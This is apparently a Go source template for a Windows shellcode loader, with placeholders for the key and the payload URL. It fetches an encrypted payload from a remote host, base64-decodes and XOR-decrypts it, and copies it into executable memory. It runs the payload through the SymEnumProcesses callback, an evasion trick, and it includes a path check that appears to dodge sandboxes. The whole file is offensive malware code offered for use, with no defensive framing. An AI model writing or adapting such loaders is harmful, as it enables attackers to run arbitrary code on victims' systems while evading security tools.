package main

import (
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"

	"github.com/valyala/fasthttp"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	FALSE                  = 0
)

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	ntdll             = syscall.NewLazyDLL("ntdll.dll")
	Dbghelp           = syscall.NewLazyDLL("Dbghelp.dll")
	VirtualAlloc      = kernel32.NewProc("VirtualAlloc")
	GetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	SymInitialize     = Dbghelp.NewProc("SymInitialize")
	SymEnumProcesses  = Dbghelp.NewProc("SymEnumProcesses")
	RtlMoveMemory     = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	Proces, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(Proces, 0, FALSE)
	SymEnumProcesses.Call(addr, 0)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(v2 string) []byte {
	key := []byte{{{Key}}}
	v22, _ := base64.StdEncoding.DecodeString(v2)
	v222 := XorDecrypt(v22, key)
	return v222
}

func fetchShellcode(url string) []byte {
	_, body, _ := fasthttp.Get(nil, url)
	return body
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext := fetchShellcode("{{REMOTE_URL}}")
	byteData := DecryptData(string(ciphertext))
	Callback(byteData)
}
